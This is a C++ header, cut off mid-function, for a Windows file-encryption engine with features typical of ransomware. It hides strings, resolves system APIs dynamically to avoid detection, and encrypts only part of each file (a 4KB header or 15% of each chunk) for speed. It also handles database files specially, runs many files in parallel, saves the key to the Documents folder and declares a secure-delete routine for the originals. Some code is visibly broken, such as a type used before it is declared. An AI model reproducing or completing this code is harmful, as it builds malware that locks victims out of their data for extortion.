#pragma once
#ifndef ENCRYPTION_UTILS_H
#define ENCRYPTION_UTILS_H

// 字符串加密头文件
#include "skCrypt.h"

#define NOMINMAX
#include <Windows.h>
#include <iostream>
#include <fstream>
#include <shlwapi.h>
#include <vector>
#include <cstdint>
#include <filesystem>
#include <random>
#include <algorithm>
#include <bcrypt.h>
#include <shlobj.h>
#include <thread>
#include <mutex>
#include <condition_variable>
#include <queue>
#include <atomic>
#include <unordered_set>
#include <sstream>
#include <iomanip>
#include <memory>
#include <climits>
#include <intrin.h>
#include <map>
#include <unordered_map>
#include <functional>
#include <stdexcept>
#include <future>
#include <deque>

#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "Ole32.lib")
#pragma comment(lib, "kernel32.lib")

// 使用inline避免重复定义
inline constexpr DWORD HEADER_ENCRYPT_SIZE = 4096; // 文件头部加密4KB
inline constexpr DWORD KEY_LENGTH = 16; // AES-128
inline constexpr DWORD IV_LENGTH = 16;  // AES块大小
inline constexpr size_t MEMORY_POOL_SIZE = 1024 * 1024 * 64; // 64MB内存池
inline constexpr DWORD MAX_CONCURRENT_IO = 64; // 最大并发I/O操作数
inline constexpr size_t ASYNC_BUFFER_SIZE = 1024 * 1024; // 1MB异步缓冲区
inline constexpr size_t CHUNK_ENCRYPT_RATIO = 15; // 分块加密比例15%
inline constexpr size_t CHUNK_SIZE = 1024 * 1024; // 分块大小1MB
inline constexpr size_t MAX_CONCURRENT_FILES = 32; // 最大并发文件处理数

namespace fs = std::filesystem;

// 前向声明
bool SecureDelete(const fs::path& path);
bool EncryptFileCNGAsync(const fs::path& inputFile, const fs::path& outputFile, const BYTE* key);

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

// 辅助函数
void GenerateRandomKey(BYTE* key, DWORD length);
bool SaveKeyToDocuments(const BYTE* key, DWORD length, const std::wstring& fileName);
fs::path GetUserDocumentsPath();
bool IsAesNiSupported();
std::string to_hex(NTSTATUS status);

// 自定义min/max替代函数
template<typename T>
inline T custom_min(T a, T b) {
    return a < b ? a : b;
}

template<typename T>
inline T custom_max(T a, T b) {
    return a > b ? a : b;
}

// 动态API函数指针定义
struct DYNAMIC_APIS {
    // Kernel32.dll
    decltype(&CreateFileW) pCreateFileW = nullptr;
    decltype(&ReadFile) pReadFile = nullptr;
    decltype(&WriteFile) pWriteFile = nullptr;
    decltype(&CloseHandle) pCloseHandle = nullptr;
    decltype(&GetFileSizeEx) pGetFileSizeEx = nullptr;
    decltype(&SetFilePointerEx) pSetFilePointerEx = nullptr;
    decltype(&SetEndOfFile) pSetEndOfFile = nullptr;
    decltype(&GetFileAttributesW) pGetFileAttributesW = nullptr;
    decltype(&SetFileAttributesW) pSetFileAttributesW = nullptr;
    decltype(&DeleteFileW) pDeleteFileW = nullptr;
    decltype(&MoveFileW) pMoveFileW = nullptr;
    decltype(&CreateFileMappingW) pCreateFileMappingW = nullptr;
    decltype(&MapViewOfFile) pMapViewOfFile = nullptr;
    decltype(&UnmapViewOfFile) pUnmapViewOfFile = nullptr;
    decltype(&VirtualAlloc) pVirtualAlloc = nullptr;
    decltype(&VirtualFree) pVirtualFree = nullptr;
    decltype(&GetSystemInfo) pGetSystemInfo = nullptr;
    decltype(&GlobalMemoryStatusEx) pGlobalMemoryStatusEx = nullptr;
    decltype(&GetProcessId) pGetProcessId = nullptr;
    decltype(&GetCurrentProcess) pGetCurrentProcess = nullptr;
    decltype(&GetLastError) pGetLastError = nullptr;
    decltype(&WaitForSingleObject) pWaitForSingleObject = nullptr;
    decltype(&CreateProcessW) pCreateProcessW = nullptr;
    decltype(&Wow64DisableWow64FsRedirection) pWow64DisableWow64FsRedirection = nullptr;
    decltype(&Wow64RevertWow64FsRedirection) pWow64RevertWow64FsRedirection = nullptr;
    decltype(&GetQueuedCompletionStatus) pGetQueuedCompletionStatus = nullptr;
    decltype(&PostQueuedCompletionStatus) pPostQueuedCompletionStatus = nullptr;
    decltype(&CreateIoCompletionPort) pCreateIoCompletionPort = nullptr;

    // Advapi32.dll
    decltype(&RegOpenKeyExW) pRegOpenKeyExW = nullptr;
    decltype(&RegCloseKey) pRegCloseKey = nullptr;

    // Shell32.dll
    decltype(&SHGetKnownFolderPath) pSHGetKnownFolderPath = nullptr;

    // Ole32.dll
    decltype(&CoInitializeEx) pCoInitializeEx = nullptr;
    decltype(&CoUninitialize) pCoUninitialize = nullptr;
    decltype(&CoInitializeSecurity) pCoInitializeSecurity = nullptr;
    decltype(&CoCreateInstance) pCoCreateInstance = nullptr;
    decltype(&CoSetProxyBlanket) pCoSetProxyBlanket = nullptr;

    // Shlwapi.dll
    decltype(&StrStrIW) pStrStrIW = nullptr;  // 修正为正确的函数指针类型

    // Ntdll.dll
    decltype(&RtlSecureZeroMemory) pRtlSecureZeroMemory = nullptr;

    // 初始化函数
    bool Initialize() {
        HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
        HMODULE hAdvapi32 = GetModuleHandleW(L"advapi32.dll");
        HMODULE hShell32 = GetModuleHandleW(L"shell32.dll");
        HMODULE hOle32 = GetModuleHandleW(L"ole32.dll");
        HMODULE hShlwapi = GetModuleHandleW(L"shlwapi.dll");
        HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");

        if (!hKernel32 || !hAdvapi32 || !hShell32 || !hOle32 || !hShlwapi || !hNtdll) {
            return false;
        }

        // Kernel32
        pCreateFileW = reinterpret_cast<decltype(pCreateFileW)>(GetProcAddress(hKernel32, "CreateFileW"));
        pReadFile = reinterpret_cast<decltype(pReadFile)>(GetProcAddress(hKernel32, "ReadFile"));
        pWriteFile = reinterpret_cast<decltype(pWriteFile)>(GetProcAddress(hKernel32, "WriteFile"));
        pCloseHandle = reinterpret_cast<decltype(pCloseHandle)>(GetProcAddress(hKernel32, "CloseHandle"));
        pGetFileSizeEx = reinterpret_cast<decltype(pGetFileSizeEx)>(GetProcAddress(hKernel32, "GetFileSizeEx"));
        pSetFilePointerEx = reinterpret_cast<decltype(pSetFilePointerEx)>(GetProcAddress(hKernel32, "SetFilePointerEx"));
        pSetEndOfFile = reinterpret_cast<decltype(pSetEndOfFile)>(GetProcAddress(hKernel32, "SetEndOfFile"));
        pGetFileAttributesW = reinterpret_cast<decltype(pGetFileAttributesW)>(GetProcAddress(hKernel32, "GetFileAttributesW"));
        pSetFileAttributesW = reinterpret_cast<decltype(pSetFileAttributesW)>(GetProcAddress(hKernel32, "SetFileAttributesW"));
        pDeleteFileW = reinterpret_cast<decltype(pDeleteFileW)>(GetProcAddress(hKernel32, "DeleteFileW"));
        pMoveFileW = reinterpret_cast<decltype(pMoveFileW)>(GetProcAddress(hKernel32, "MoveFileW"));
        pCreateFileMappingW = reinterpret_cast<decltype(pCreateFileMappingW)>(GetProcAddress(hKernel32, "CreateFileMappingW"));
        pMapViewOfFile = reinterpret_cast<decltype(pMapViewOfFile)>(GetProcAddress(hKernel32, "MapViewOfFile"));
        pUnmapViewOfFile = reinterpret_cast<decltype(pUnmapViewOfFile)>(GetProcAddress(hKernel32, "UnmapViewOfFile"));
        pVirtualAlloc = reinterpret_cast<decltype(pVirtualAlloc)>(GetProcAddress(hKernel32, "VirtualAlloc"));
        pVirtualFree = reinterpret_cast<decltype(pVirtualFree)>(GetProcAddress(hKernel32, "VirtualFree"));
        pGetSystemInfo = reinterpret_cast<decltype(pGetSystemInfo)>(GetProcAddress(hKernel32, "GetSystemInfo"));
        pGlobalMemoryStatusEx = reinterpret_cast<decltype(pGlobalMemoryStatusEx)>(GetProcAddress(hKernel32, "GlobalMemoryStatusEx"));
        pGetProcessId = reinterpret_cast<decltype(pGetProcessId)>(GetProcAddress(hKernel32, "GetProcessId"));
        pGetCurrentProcess = reinterpret_cast<decltype(pGetCurrentProcess)>(GetProcAddress(hKernel32, "GetCurrentProcess"));
        pGetLastError = reinterpret_cast<decltype(pGetLastError)>(GetProcAddress(hKernel32, "GetLastError"));
        pWaitForSingleObject = reinterpret_cast<decltype(pWaitForSingleObject)>(GetProcAddress(hKernel32, "WaitForSingleObject"));
        pCreateProcessW = reinterpret_cast<decltype(pCreateProcessW)>(GetProcAddress(hKernel32, "CreateProcessW"));
        pWow64DisableWow64FsRedirection = reinterpret_cast<decltype(pWow64DisableWow64FsRedirection)>(GetProcAddress(hKernel32, "Wow64DisableWow64FsRedirection"));
        pWow64RevertWow64FsRedirection = reinterpret_cast<decltype(pWow64RevertWow64FsRedirection)>(GetProcAddress(hKernel32, "Wow64RevertWow64FsRedirection"));
        pGetQueuedCompletionStatus = reinterpret_cast<decltype(pGetQueuedCompletionStatus)>(GetProcAddress(hKernel32, "GetQueuedCompletionStatus"));
        pPostQueuedCompletionStatus = reinterpret_cast<decltype(pPostQueuedCompletionStatus)>(GetProcAddress(hKernel32, "PostQueuedCompletionStatus"));
        pCreateIoCompletionPort = reinterpret_cast<decltype(pCreateIoCompletionPort)>(GetProcAddress(hKernel32, "CreateIoCompletionPort"));

        // Advapi32
        pRegOpenKeyExW = reinterpret_cast<decltype(pRegOpenKeyExW)>(GetProcAddress(hAdvapi32, "RegOpenKeyExW"));
        pRegCloseKey = reinterpret_cast<decltype(pRegCloseKey)>(GetProcAddress(hAdvapi32, "RegCloseKey"));

        // Shell32
        pSHGetKnownFolderPath = reinterpret_cast<decltype(pSHGetKnownFolderPath)>(GetProcAddress(hShell32, "SHGetKnownFolderPath"));

        // Ole32
        pCoInitializeEx = reinterpret_cast<decltype(pCoInitializeEx)>(GetProcAddress(hOle32, "CoInitializeEx"));
        pCoUninitialize = reinterpret_cast<decltype(pCoUninitialize)>(GetProcAddress(hOle32, "CoUninitialize"));
        pCoInitializeSecurity = reinterpret_cast<decltype(pCoInitializeSecurity)>(GetProcAddress(hOle32, "CoInitializeSecurity"));
        pCoCreateInstance = reinterpret_cast<decltype(pCoCreateInstance)>(GetProcAddress(hOle32, "CoCreateInstance"));
        pCoSetProxyBlanket = reinterpret_cast<decltype(pCoSetProxyBlanket)>(GetProcAddress(hOle32, "CoSetProxyBlanket"));

        // Shlwapi - 修正为加载StrStrIW函数
        pStrStrIW = reinterpret_cast<decltype(pStrStrIW)>(GetProcAddress(hShlwapi, "StrStrIW"));

        // Ntdll
        pRtlSecureZeroMemory = reinterpret_cast<decltype(pRtlSecureZeroMemory)>(GetProcAddress(hNtdll, "RtlSecureZeroMemory"));

        // 验证加载
        if (!pCreateFileW || !pReadFile || !pWriteFile || !pCloseHandle ||
            !pGetFileSizeEx || !pSetFilePointerEx || !pSetEndOfFile || !pDeleteFileW ||
            !pCreateFileMappingW || !pMapViewOfFile || !pUnmapViewOfFile ||
            !pVirtualAlloc || !pVirtualFree || !pGetSystemInfo || !pGlobalMemoryStatusEx ||
            !pGetLastError || !pCreateIoCompletionPort || !pGetQueuedCompletionStatus ||
            !pPostQueuedCompletionStatus || !pRegOpenKeyExW || !pRegCloseKey ||
            !pSHGetKnownFolderPath || !pCoInitializeEx || !pCoUninitialize ||
            !pCoInitializeSecurity || !pCoCreateInstance || !pCoSetProxyBlanket ||
            !pStrStrIW || !pRtlSecureZeroMemory) {
            return false;
        }

        return true;
    }
};

// 全局动态API实例
inline DYNAMIC_APIS g_APIs;

// 异步I/O操作类型
enum class AsyncIOType {
    READ,
    WRITE,
    ENCRYPT,
    DELETE
};

// 异步I/O上下文
struct AsyncIOContext {
    OVERLAPPED overlapped;
    HANDLE hFile;
    void* buffer;
    DWORD bufferSize;
    DWORD bytesTransferred;
    AsyncIOType operationType;
    std::function<void(bool, DWORD)> callback;
    std::atomic<bool> completed;
    LARGE_INTEGER fileOffset;
    size_t chunkIndex;
    std::vector<BYTE> encryptionResult;
    fs::path filePath;
    AsyncEncryptContext* encryptContext; // 确保 encryptContext 是成员变量

    AsyncIOContext()
        : hFile(INVALID_HANDLE_VALUE), buffer(nullptr), bufferSize(0),
        bytesTransferred(0), operationType(AsyncIOType::READ), completed(false),
        chunkIndex(0), encryptContext(nullptr) { // 初始化 encryptContext
        ZeroMemory(&overlapped, sizeof(OVERLAPPED));
        fileOffset.QuadPart = 0;
    }

    ~AsyncIOContext() {
        if (buffer) {
            g_APIs.pVirtualFree(buffer, 0, MEM_RELEASE);
        }
    }

    bool allocateBuffer(DWORD size) {
        buffer = g_APIs.pVirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!buffer) return false;
        bufferSize = size;
        return true;
    }
};


// IOCP线程池实现
class IOCPThreadPool {
public:
    IOCPThreadPool(size_t minThreads, size_t maxThreads) : stop(false) {
        hCompletionPort = g_APIs.pCreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, 0, 0);
        if (!hCompletionPort) {
            throw std::runtime_error("Failed to create IOCP");
        }

        threadCount = CalculateOptimalThreadCount(minThreads, maxThreads);
        for (size_t i = 0; i < threadCount; ++i) {
            threads.emplace_back([this] { worker(); });
        }
    }

    ~IOCPThreadPool() {
        stop = true;
        for (size_t i = 0; i < threads.size(); ++i) {
            g_APIs.pPostQueuedCompletionStatus(hCompletionPort, 0, 0, NULL);
        }

        for (auto& thread : threads) {
            if (thread.joinable()) thread.join();
        }

        if (hCompletionPort) g_APIs.pCloseHandle(hCompletionPort);
    }

    bool associateDevice(HANDLE hDevice, ULONG_PTR completionKey) {
        return g_APIs.pCreateIoCompletionPort(hDevice, hCompletionPort, completionKey, 0) != NULL;
    }

    bool postCompletion(DWORD bytesTransferred, ULONG_PTR completionKey, OVERLAPPED* overlapped) {
        return g_APIs.pPostQueuedCompletionStatus(hCompletionPort, bytesTransferred, completionKey, overlapped);
    }

    HANDLE getCompletionPort() const {
        return hCompletionPort;
    }

private:
    size_t CalculateOptimalThreadCount(size_t minThreads, size_t maxThreads) {
        SYSTEM_INFO sysInfo;
        g_APIs.pGetSystemInfo(&sysInfo);

        size_t cpuCount = sysInfo.dwNumberOfProcessors;
        if (cpuCount == 0) cpuCount = 1;

        // 根据CPU和内存大小计算线程数
        MEMORYSTATUSEX memInfo;
        memInfo.dwLength = sizeof(memInfo);
        g_APIs.pGlobalMemoryStatusEx(&memInfo);

        size_t memoryBasedThreads = static_cast<size_t>(memInfo.ullTotalPhys / (1024 * 1024 * 1024)) * 2;

        size_t dynamicCount = custom_min(cpuCount * 2 + memoryBasedThreads, maxThreads);
        size_t temp = custom_min(dynamicCount, maxThreads);
        return custom_max(temp, minThreads);
    }

    void worker() {
        while (!stop) {
            DWORD bytesTransferred = 0;
            ULONG_PTR completionKey = 0;
            OVERLAPPED* overlapped = nullptr;

            BOOL success = g_APIs.pGetQueuedCompletionStatus(
                hCompletionPort, &bytesTransferred, &completionKey, &overlapped, INFINITE);

            if (stop) break;

            if (!success) {
                DWORD error = g_APIs.pGetLastError();
                if (overlapped) {
                    AsyncIOContext* context = reinterpret_cast<AsyncIOContext*>(overlapped);
                    if (context && context->callback) {
                        context->bytesTransferred = bytesTransferred;
                        context->callback(false, error);
                        context->completed = true;
                    }
                }
                continue;
            }

            if (overlapped == nullptr) {
                // 停止信号
                continue;
            }

            AsyncIOContext* context = reinterpret_cast<AsyncIOContext*>(overlapped);
            if (context && context->callback) {
                context->bytesTransferred = bytesTransferred;
                context->callback(true, ERROR_SUCCESS);
                context->completed = true;
            }
        }
    }

    HANDLE hCompletionPort;
    std::vector<std::thread> threads;
    std::atomic<bool> stop;
    size_t threadCount;
};

// 内存池
class SmartMemoryPool {
public:
    SmartMemoryPool(size_t poolSize = MEMORY_POOL_SIZE) : poolSize(poolSize) {
        pool = g_APIs.pVirtualAlloc(NULL, poolSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!pool) {
            throw std::runtime_error("Failed to allocate memory pool");
        }

        freeBlocks.emplace(0, poolSize);
    }

    ~SmartMemoryPool() {
        if (pool) {
            g_APIs.pVirtualFree(pool, 0, MEM_RELEASE);
        }
    }

    void* allocate(size_t size) {
        std::lock_guard<std::mutex> lock(mutex);

        // 寻找足够大的空闲块
        for (auto it = freeBlocks.begin(); it != freeBlocks.end(); ++it) {
            if (it->second >= size) {
                void* ptr = static_cast<char*>(pool) + it->first;

                // 分割块
                if (it->second > size) {
                    freeBlocks[it->first + size] = it->second - size;
                }
                freeBlocks.erase(it);

                allocatedBlocks[ptr] = size;
                return ptr;
            }
        }

        // 没有足够空间，回退到常规分配
        return g_APIs.pVirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    }

    void deallocate(void* ptr) {
        std::lock_guard<std::mutex> lock(mutex);

        auto it = allocatedBlocks.find(ptr);
        if (it == allocatedBlocks.end()) {
            // 不是从池中分配的，使用常规释放
            g_APIs.pVirtualFree(ptr, 0, MEM_RELEASE);
            return;
        }

        size_t offset = static_cast<char*>(ptr) - static_cast<char*>(pool);
        size_t size = it->second;

        // 合并相邻的空闲块
        freeBlocks[offset] = size;
        mergeFreeBlocks();

        allocatedBlocks.erase(it);
    }

private:
    void mergeFreeBlocks() {
        auto it = freeBlocks.begin();
        while (it != freeBlocks.end()) {
            auto next = it;
            ++next;

            if (next != freeBlocks.end() && it->first + it->second == next->first) {
                // 合并相邻块
                it->second += next->second;
                freeBlocks.erase(next);
            }
            else {
                ++it;
            }
        }
    }

    void* pool;
    size_t poolSize;
    std::mutex mutex;
    std::map<size_t, size_t> freeBlocks; // offset -> size
    std::unordered_map<void*, size_t> allocatedBlocks; // ptr -> size
};

// 全局内存池
inline SmartMemoryPool& getGlobalMemoryPool() {
    static SmartMemoryPool pool;
    return pool;
}

// 全局IOCP线程池
inline std::unique_ptr<IOCPThreadPool>& getGlobalIOCPPool() {
    static std::unique_ptr<IOCPThreadPool> pool;
    if (!pool) {
        pool = std::make_unique<IOCPThreadPool>(4, 64);
    }
    return pool;
}

// RAII封装 - 内存映射文件类（异步版本）
class AsyncMemoryMappedFile {
public:
    AsyncMemoryMappedFile() : hFile(INVALID_HANDLE_VALUE), hMapping(NULL), pData(nullptr), size(0) {}
    ~AsyncMemoryMappedFile() { close(); }

    bool open(const fs::path& filePath, DWORD access = GENERIC_READ | GENERIC_WRITE,
        DWORD mappingProtect = PAGE_READWRITE, DWORD viewAccess = FILE_MAP_READ | FILE_MAP_WRITE) {
        close();

        // 异步打开文件
        hFile = g_APIs.pCreateFileW(filePath.c_str(), access, FILE_SHARE_READ, NULL,
            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            return false;
        }

        // 关联到IOCP
        if (!getGlobalIOCPPool()->associateDevice(hFile, reinterpret_cast<ULONG_PTR>(this))) {
            g_APIs.pCloseHandle(hFile);
            hFile = INVALID_HANDLE_VALUE;
            return false;
        }

        // 获取文件大小
        LARGE_INTEGER fileSize;
        if (!g_APIs.pGetFileSizeEx(hFile, &fileSize)) {
            g_APIs.pCloseHandle(hFile);
            hFile = INVALID_HANDLE_VALUE;
            return false;
        }
        size = static_cast<size_t>(fileSize.QuadPart);

        // 创建内存映射
        hMapping = g_APIs.pCreateFileMappingW(hFile, NULL, mappingProtect, 0, 0, NULL);
        if (hMapping == NULL) {
            DWORD error = g_APIs.pGetLastError();
            g_APIs.pCloseHandle(hFile);
            hFile = INVALID_HANDLE_VALUE;
            std::cerr << "CreateFileMappingW failed. Error: " << error << std::endl;
            return false;
        }

        // 映射视图
        pData = g_APIs.pMapViewOfFile(hMapping, viewAccess, 0, 0, size);
        if (pData == NULL) {
            DWORD error = g_APIs.pGetLastError();
            g_APIs.pCloseHandle(hMapping);
            g_APIs.pCloseHandle(hFile);
            hMapping = NULL;
            hFile = INVALID_HANDLE_VALUE;
            std::cerr << "MapViewOfFile failed. Error: " << error << std::endl;
            return false;
        }

        return true;
    }

    void close() {
        if (pData) {
            g_APIs.pUnmapViewOfFile(pData);
            pData = nullptr;
        }
        if (hMapping != NULL) {
            g_APIs.pCloseHandle(hMapping);
            hMapping = NULL;
        }
        if (hFile != INVALID_HANDLE_VALUE) {
            g_APIs.pCloseHandle(hFile);
            hFile = INVALID_HANDLE_VALUE;
        }
        size = 0;
    }

    void* data() const { return pData; }
    size_t getSize() const { return size; }
    bool isOpen() const { return pData != nullptr; }

    // 异步读取
    bool readAsync(AsyncIOContext& context, LARGE_INTEGER offset, DWORD size) {
        context.hFile = hFile;
        context.fileOffset = offset;

        if (!context.allocateBuffer(size)) {
            return false;
        }

        // 发起异步读取
        return g_APIs.pReadFile(hFile, context.buffer, size, NULL, &context.overlapped);
    }

    // 异步写入
    bool writeAsync(AsyncIOContext& context, LARGE_INTEGER offset, DWORD size) {
        context.hFile = hFile;
        context.fileOffset = offset;

        if (!context.buffer || context.bufferSize < size) {
            if (!context.allocateBuffer(size)) {
                return false;
            }
        }

        // 发起异步写入
        return g_APIs.pWriteFile(hFile, context.buffer, size, NULL, &context.overlapped);
    }

private:
    HANDLE hFile;
    HANDLE hMapping;
    void* pData;
    size_t size;
};

// 异步加密管理器
class AsyncEncryptionManager {
public:
    AsyncEncryptionManager(size_t maxConcurrentTasks = MAX_CONCURRENT_FILES)
        : maxConcurrentTasks(maxConcurrentTasks), stop(false), activeTasks(0),
        completedTasks(0), failedTasks(0) {
        // 初始化IOCP线程池
        getGlobalIOCPPool();
    }

    ~AsyncEncryptionManager() {
        stop = true;
        condition.notify_all();
    }

    void addTask(const fs::path& inputFile, const fs::path& outputFile, const BYTE* key) {
        std::unique_lock<std::mutex> lock(queueMutex);
        tasks.push({ inputFile, outputFile, key });
        lock.unlock();
        condition.notify_one();
    }

    void waitForCompletion() {
        std::unique_lock<std::mutex> lock(queueMutex);
        completionCondition.wait(lock, [this] {
            return tasks.empty() && activeTasks == 0;
            });
    }

    void processTasks() {
        while (!stop) {
            std::tuple<fs::path, fs::path, const BYTE*> task;

            {
                std::unique_lock<std::mutex> lock(queueMutex);
                condition.wait(lock, [this] {
                    return stop || !tasks.empty();
                    });

                if (stop && tasks.empty()) break;
                if (tasks.empty()) continue;

                task = tasks.front();
                tasks.pop();
                activeTasks++;
            }

            // 执行加密任务
            fs::path inputFile = std::get<0>(task);
            fs::path outputFile = std::get<1>(task);
            const BYTE* key = std::get<2>(task);

            // 使用异步版本的EncryptFileCNG
            bool encryptSuccess = EncryptFileCNGAsync(inputFile, outputFile, key);

            {
                std::lock_guard<std::mutex> lock(queueMutex);
                if (encryptSuccess) {
                    completedTasks++;
                }
                else {
                    failedTasks++;
                }

                activeTasks--;
                if (tasks.empty() && activeTasks == 0) {
                    completionCondition.notify_all();
                }
            }
        }
    }

    void startProcessing() {
        for (size_t i = 0; i < maxConcurrentTasks; ++i) {
            workers.emplace_back([this] { processTasks(); });
        }
    }

    void stopProcessing() {
        stop = true;
        condition.notify_all();

        for (auto& worker : workers) {
            if (worker.joinable()) worker.join();
        }
    }

    void printStatistics() {
        std::cout << "加密任务统计: " << std::endl;
        std::cout << "  成功: " << completedTasks << " 个文件" << std::endl;
        std::cout << "  失败: " << failedTasks << " 个文件" << std::endl;
        std::cout << "  总计: " << (completedTasks + failedTasks) << " 个文件" << std::endl;
    }

private:
    std::queue<std::tuple<fs::path, fs::path, const BYTE*>> tasks;
    std::vector<std::thread> workers;
    std::mutex queueMutex;
    std::condition_variable condition;
    std::condition_variable completionCondition;
    std::atomic<bool> stop;
    std::atomic<size_t> activeTasks;
    std::atomic<size_t> completedTasks;
    std::atomic<size_t> failedTasks;
    size_t maxConcurrentTasks;
};

// 计算分块加密大小
inline size_t CalculateChunkEncryptSize(size_t chunkSize) {
    size_t encryptSize = static_cast<size_t>(chunkSize * CHUNK_ENCRYPT_RATIO / 100.0);
    // 对齐到16字节边界（AES块大小）
    encryptSize = encryptSize - (encryptSize % 16);
    return custom_max(encryptSize, static_cast<size_t>(16));
}

// 异步加密上下文
struct AsyncEncryptContext {
    BCRYPT_ALG_HANDLE hAlgorithm;
    BCRYPT_KEY_HANDLE hKey;
    std::vector<BYTE> keyObject;
    std::vector<BYTE> iv;
    fs::path inputFile;
    fs::path outputFile;
    const BYTE* encryptionKey;
    size_t fileSize;
    bool isDatabaseFile;
    HANDLE hOutputFile;
    std::vector<AsyncIOContext> ioContexts;
    size_t currentChunk;
    size_t totalChunks;
    std::atomic<size_t> completedChunks;
    std::promise<bool> completionPromise;
    std::vector<std::vector<BYTE>> encryptedChunks;
    std::vector<std::vector<BYTE>> chunkBuffers;

    AsyncEncryptContext() : hAlgorithm(NULL), hKey(NULL), encryptionKey(nullptr),
        fileSize(0), isDatabaseFile(false), hOutputFile(INVALID_HANDLE_VALUE),
        currentChunk(0), totalChunks(0), completedChunks(0) {
    }

    ~AsyncEncryptContext() {
        if (hKey) {
            BCryptDestroyKey(hKey);
        }
        if (hAlgorithm) {
            BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        }
        if (hOutputFile != INVALID_HANDLE_VALUE) {
            g_APIs.pCloseHandle(hOutputFile);
        }
    }
};

// 异步加密回调
void AsyncEncryptCallback(AsyncIOContext* context, bool success, DWORD error) {
    AsyncEncryptContext* encryptContext = reinterpret_cast<AsyncEncryptContext*>(context->overlapped.hEvent);

    if (!success) {
        std::cerr << "异步操作失败: " << error << " 块: " << context->chunkIndex << std::endl;
        encryptContext->completionPromise.set_value(false);
        return;
    }

    if (context->operationType == AsyncIOType::READ) {
        // 读取完成，开始加密
        std::vector<BYTE>& chunkData = encryptContext->chunkBuffers[context->chunkIndex];
        std::vector<BYTE>& encryptedData = encryptContext->encryptedChunks[context->chunkIndex];

        // 加密数据
        ULONG cbResult = 0;
        NTSTATUS status = BCryptEncrypt(
            encryptContext->hKey,
            chunkData.data(),
            static_cast<ULONG>(chunkData.size()),
            nullptr,
            encryptContext->iv.data(),
            IV_LENGTH,
            encryptedData.data(),
            static_cast<ULONG>(encryptedData.size()),
            &cbResult,
            BCRYPT_BLOCK_PADDING
        );

        if (!NT_SUCCESS(status)) {
            std::cerr << "加密失败: " << to_hex(status) << " 块: " << context->chunkIndex << std::endl;
            encryptContext->completionPromise.set_value(false);
            return;
        }

        encryptedData.resize(cbResult);

        // 准备写入操作
        AsyncIOContext& writeContext = encryptContext->ioContexts[context->chunkIndex + encryptContext->totalChunks];
        writeContext.operationType = AsyncIOType::WRITE;
        writeContext.chunkIndex = context->chunkIndex;
        writeContext.overlapped.hEvent = reinterpret_cast<HANDLE>(encryptContext);
        writeContext.callback = AsyncEncryptCallback;

        LARGE_INTEGER writeOffset;
        writeOffset.QuadPart = encryptContext->isDatabaseFile ?
            (context->chunkIndex * CHUNK_SIZE) :
            (IV_LENGTH + context->chunkIndex * CHUNK_SIZE);

        // 复制加密数据到写入缓冲区
        if (!writeContext.allocateBuffer(encryptedData.size())) {
            encryptContext->completionPromise.set_value(false);
            return;
        }

        memcpy(writeContext.buffer, encryptedData.data(), encryptedData.size());

        // 发起异步写入
        if (!g_APIs.pWriteFile(encryptContext->hOutputFile, writeContext.buffer,
            static_cast<DWORD>(encryptedData.size()), NULL, &writeContext.overlapped)) {
            DWORD writeError = g_APIs.pGetLastError();
            if (writeError != ERROR_IO_PENDING) {
                std::cerr << "写入操作失败: " << writeError << " 块: " << context->chunkIndex << std::endl;
                encryptContext->completionPromise.set_value(false);
            }
        }
    }
    else if (context->operationType == AsyncIOType::WRITE) {
        // 写入完成，更新完成计数
        encryptContext->completedChunks++;

        if (encryptContext->completedChunks == encryptContext->totalChunks) {
            // 所有块都处理完成
            encryptContext->completionPromise.set_value(true);
        }
    }
}

// 异步版本的EncryptFileCNG
bool EncryptFileCNGAsync(const fs::path& inputFile, const fs::path& outputFile, const BYTE* key) {
    std::shared_ptr<AsyncEncryptContext> context = std::make_shared<AsyncEncryptContext>();
    context->inputFile = inputFile;
    context->outputFile = outputFile;
    context->encryptionKey = key;

    try {
        // 检查AES-NI硬件加速支持
        bool hwAccelSupported = IsAesNiSupported();
        const wchar_t* algorithmProvider = hwAccelSupported ?
            BCRYPT_AES_ALGORITHM : MS_PRIMITIVE_PROVIDER;

        NTSTATUS status = BCryptOpenAlgorithmProvider(&context->hAlgorithm, algorithmProvider, NULL, 0);
        if (!NT_SUCCESS(status)) {
            status = BCryptOpenAlgorithmProvider(&context->hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
            if (!NT_SUCCESS(status)) {
                throw std::runtime_error(std::string("BCryptOpenAlgorithmProvider failed: ") + to_hex(status));
            }
        }

        // 设置加密模式为CBC
        const wchar_t* chainMode = BCRYPT_CHAIN_MODE_CBC;
        status = BCryptSetProperty(context->hAlgorithm, BCRYPT_CHAINING_MODE,
            reinterpret_cast<PBYTE>(const_cast<wchar_t*>(chainMode)),
            static_cast<ULONG>(wcslen(chainMode) * sizeof(wchar_t)), 0);
        if (!NT_SUCCESS(status)) {
            throw std::runtime_error(std::string("BCryptSetProperty failed: ") + to_hex(status));
        }

        // 获取密钥对象大小
        DWORD cbKeyObject = 0;
        DWORD cbData = 0;
        status = BCryptGetProperty(context->hAlgorithm, BCRYPT_OBJECT_LENGTH,
            reinterpret_cast<PBYTE>(&cbKeyObject), sizeof(DWORD), &cbData, 0);
        if (!NT_SUCCESS(status)) {
            throw std::runtime_error(std::string("BCryptGetProperty(OBJECT_LENGTH) failed: ") + to_hex(status));
        }

        context->keyObject.resize(cbKeyObject);

        // 生成对称密钥
        status = BCryptGenerateSymmetricKey(
            context->hAlgorithm, &context->hKey, context->keyObject.data(), cbKeyObject,
            const_cast<BYTE*>(key), KEY_LENGTH, 0);
        if (!NT_SUCCESS(status)) {
            throw std::runtime_error(std::string("BCryptGenerateSymmetricKey failed: ") + to_hex(status));
        }

        // 生成IV
        context->iv.resize(IV_LENGTH);
